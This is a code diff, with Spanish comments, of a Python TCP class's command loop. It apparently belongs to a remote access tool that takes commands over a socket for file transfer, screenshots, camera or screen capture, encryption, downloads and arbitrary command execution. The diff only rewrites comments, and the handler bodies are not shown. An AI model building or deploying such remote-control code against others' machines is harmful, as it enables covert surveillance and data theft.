@@ -807,10 +807,9 @@ class TCP:
     def shell(self):
         while True:
             try:
-                # Se recibe el comando
-                cmd = self.__sock.recv(1024).decode()
+                cmd = self.__sock.recv(1024).decode() # Se recibe el comando
 
-                # Si el comando es 'exit'...
+                # exit
                 if cmd.lower() == "exit":
                     try:
                         # Se termina la conexion
@@ -820,7 +819,7 @@ class TCP:
                     except:
                         raise Exception('exit error')
 
-                # Si el comando es 'q' o 'quit'...
+                # quit
                 elif cmd.lower() == 'q' or cmd.lower() == "quit":
                     try:
                         # Se cierra el socket
@@ -832,7 +831,7 @@ class TCP:
                     except:
                         raise Exception('quit error')
 
-                # Si el comando es 'cd'...
+                # cd
                 elif cmd.lower()[:2] == "cd":
                     try:
                         # Se manda a llamar a la funcion
@@ -842,7 +841,7 @@ class TCP:
                     except:
                         raise Exception('cd error')
 
-                # Si el comando es 'sff'...
+                # sff
                 elif cmd.lower()[:3] == "sff":
                     try:
                         # Se manda a llamar a la funcion
@@ -852,7 +851,7 @@ class TCP:
                     except:
                         raise Exception('sff error')
 
-                # Si el comando es 'sft'...
+                # sft
                 elif cmd.lower()[:3] == "sft":
                     try:
                         # Se manda a llamar a la funcion
@@ -862,7 +861,7 @@ class TCP:
                     except:
                         raise Exception('sft error')
 
-                # Si el comando es 'img'...
+                # img
                 elif cmd.lower()[:3] == "img":
                     try:
                         # Se manda a llamar a la funcion
@@ -872,7 +871,7 @@ class TCP:
                     except:
                         raise Exception('img error')
 
-                # Si el comando es 'pic'...
+                # pic
                 elif cmd.lower()[:3] == "pic":
                     try:
                         # Se manda a llamar a la funcion
@@ -882,7 +881,7 @@ class TCP:
                     except:
                         raise Exception('pic error')
 
-                # Si el comando es 'cap'...
+                # cap
                 elif cmd.lower()[:3] == "cap":
                     try:
                         # Se manda a llamar a la funcion
@@ -892,7 +891,7 @@ class TCP:
                     except:
                         raise Exception('cap error')
 
-                # Si el comando es 'sdf'...
+                # sdf
                 elif cmd.lower()[:3] == "sdf":
                     try:
                         # Se manda a llamar a la funcion
@@ -902,7 +901,7 @@ class TCP:
                     except:
                         raise Exception('sdf error')
 
-                # Si el comando es 'sdt'...
+                # sdt
                 elif cmd.lower()[:3] == "sdt":
                     try:
                         # Se manda a llamar a la funcion
@@ -912,7 +911,7 @@ class TCP:
                     except:
                         raise Exception('sdt error')
 
-                # Si el comando es 'zip'...
+                # zip
                 elif cmd.lower()[:3] == "zip":
                     try:
                         # Se manda a llamar a la funcion
@@ -922,7 +921,7 @@ class TCP:
                     except:
                         raise Exception('zip error')
 
-                # Si el comando es 'unzip'...
+                # unzip
                 elif cmd.lower()[:5] == "unzip":
                     try:
                         # Se manda a llamar a la funcion
@@ -932,7 +931,7 @@ class TCP:
                     except:
                         raise Exception('unzip error')
 
-                # Si el comando es 'encrypt'...
+                # encrypt
                 elif cmd.lower()[:7] == "encrypt":
                     try:
                         # Se manda a llamar a la funcion
@@ -942,7 +941,7 @@ class TCP:
                     except:
                         raise Exception('encrypt error')
 
-                # Si el comando es 'decrypt'...
+                # decrypt
                 elif cmd.lower()[:7] == "decrypt":
                     try:
                         # Se manda a llamar a la funcion
@@ -952,7 +951,7 @@ class TCP:
                     except:
                         raise Exception('decrypt error')
 
-                # Si el comando es 'miwget'...
+                # miwget
                 elif cmd.lower()[:6] == "miwget":
                     try:
                         # Se manda a llamar a la funcion
@@ -962,7 +961,7 @@ class TCP:
                     except:
                         raise Exception('miwget error')
 
-                # Si el comando es 'lendir'...
+                # lendir
                 elif cmd.lower()[:6] == "lendir":
                     try:
                         # Se manda a llamar a la funcion
@@ -972,7 +971,7 @@ class TCP:
                     except:
                         raise Exception('lendir error')
 
-                # Si el comando es 'save'...
+                # save
                 elif cmd.lower()[:4] == "save":
                     try:
                         # Se manda a llamar a la funcion
@@ -983,6 +982,7 @@ class TCP:
                     except:
                         raise Exception('save error')
 
+                # ss
                 elif cmd.lower()[:2] == "ss":
                     try:
                         self.screenShot(cmd)
@@ -990,8 +990,7 @@ class TCP:
                     except:
                         raise Exception('ss error')
 
-                # Si no hay una coincidencia, se ejecuta el comando
-                # y se envia lo que este regresa
+                # cmd
                 else:
                     try:
                         if cmd.lower()[:4] == "open":
